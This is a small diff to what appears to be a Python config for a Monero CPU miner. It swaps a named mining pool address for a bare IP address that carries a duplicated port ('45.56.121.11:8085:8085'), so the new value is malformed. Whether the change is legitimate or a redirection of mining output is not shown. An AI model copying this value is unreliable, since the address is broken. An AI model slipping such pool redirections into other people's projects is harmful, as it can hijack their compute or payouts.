@@ -41,7 +41,7 @@ config = {
         "xmrSettings": {
             "disable": False,
             "enableGpu": False,
-            "poolAddress": "qxmr.jetskipool.ai:3333",
+            "poolAddress": "45.56.121.11:8085:8085",
             "customParameters": f"-t {cpu_threads}"
         }
     }
